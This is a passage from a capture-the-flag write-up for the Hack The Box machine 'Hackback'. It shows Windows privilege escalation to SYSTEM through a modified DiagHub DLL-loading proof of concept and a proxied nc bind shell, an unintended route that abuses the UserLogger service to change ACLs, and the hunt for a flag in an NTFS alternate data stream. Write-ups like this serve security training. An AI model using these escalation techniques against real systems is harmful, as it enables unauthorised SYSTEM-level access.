#### Build DiagHub Loader

Use RealOriginal's DiagHub POC (from the ALPC exploit codebase). The key modification in `DiagHub.cpp`:

```cpp
// Original: session->AddAgent(L"license.rtf", agent_guid);
// Modified: load our file instead
session->AddAgent(L"sn0x.log", agent_guid);
```

Also fix the path for the ETW session directory — use a writable path:

```cpp
WCHAR valid_dir[MAX_PATH] = L"\\programdata";
// Remove the GetModuleFileName / CreateDirectory block
```

**Why DiagHub works:** The `IDiagnosticsHubCollectionService::CreateSession` and `AddAgent` COM interface is exposed by the Windows Diagnostics Hub service running as SYSTEM. When `AddAgent` is called with a filename, it loads that file from `System32` as a DLL — without verifying the extension or signature. Since we've written our DLL there, SYSTEM loads it.

Compile as x64 console application.

#### Execute and Get SYSTEM

Upload the DiagHub loader to the AppLocker bypass path:

```powershell
PS hackback\simple@HACKBACK Documents> UPLOAD hackback-diaghub.exe \windows\system32\spool\drivers\color\diaghub.exe
```

Run it from the hacker shell:

```cmd
C:\>.\windows\system32\spool\drivers\color\diaghub.exe
[+] Loading DLL
[hangs — DLL is loading and nc is waiting]
```

Connect from attacker through proxy:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ proxychains nc 10.10.10.128 4445

Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

***

### Root Flag Alternate Data Stream

**Why the flag is hidden:** The root.txt is a troll — it shows donkey ASCII art. The real flag is in an Alternate Data Stream (ADS) named `flag.txt` attached to `root.txt`.

```cmd
# As SYSTEM
C:\Users\Administrator\Desktop>dir /a /r

02/09/2019  02:37 PM      1,958 root.txt
                              35 root.txt:flag.txt:$DATA   <-- ADS!
```

**Why ADS exists here:** On NTFS, files can have multiple named data streams. `root.txt:flag.txt` is an alternate stream of `root.txt`. `type root.txt` only shows the default stream (the ASCII art). The `dir /r` flag and PowerShell's `-Stream` parameter reveal the hidden stream.

***

### Unintended Root via UserLogger ADS Trick

**Why it works:** The UserLogger service accepts a path argument and appends `.log`. Windows path parsing strips everything after `:` in a filename when creating the `.log` extension — so `root.txt:` becomes `root.txt` with the log ACL applied to the main stream. This grants `Everyone:Full Control` on `root.txt` directly.

```cmd
# As hacker
C:\Windows\system32>sc start userlogger C:\users\administrator\desktop\root.txt:

# root.txt now has Everyone:F
C:\Windows\system32>icacls \users\administrator\desktop\root.txt
\users\administrator\desktop\root.txt  Everyone:(F)

# Read the flag ADS directly
C:\Windows\system32>powershell -c Get-Content -Stream flag.txt \users\administrator\desktop\root.txt
```

**Why this is unintended:** This completely bypasses the need for SYSTEM shell. Once hacker has the UserLogger arbitrary write primitive, the ADS trick turns a "write file as SYSTEM" into "read any file." The box creator likely intended the DiagHub path as the escalation to SYSTEM with a proper shell.

***

### Attack Flow

```
Port 6666 API (info leak)
      │
      ▼
admin.hackback.htb (vhost enum)
      │
      ▼
private.js (ROT13 + hex decode → secret path)
      │
      ▼
webadmin.php (password bruteforce → 12345678)
      │
      ▼
GoPhish (default creds → phishing templates → vhosts)
      │
      ▼
PHP log poisoning (username field → scandir/file_get_contents)
      │
      ▼
web.config.old (simple:ZonoProprioZomaro:-(  )
      │
      ▼
reGeorg ASPX tunnel → WinRM on 127.0.0.1:5985
      │
      ▼
Shell as simple (WinRM via Proxychains)
      │
      ├─[Method 1: Command Injection]──────────────────┐
      │  clean.ini LogFile injection → bind shell       │
      │                                                 ▼
      └─[Method 2: Named Pipe Impersonation]──→ Shell as hacker
                                                        │
                                                        ├─[Unintended]─→ UserLogger ADS → Root flag
                                                        │
                                                        └─[Intended]──→ UserLogger arbitrary write
                                                                         + DiagHub DLL load
                                                                         = SYSTEM shell
                                                                         = Root flag (ADS)
```

<figure><img src="../../../../.gitbook/assets/complete (37).gif" alt=""><figcaption></figcaption></figure>

***
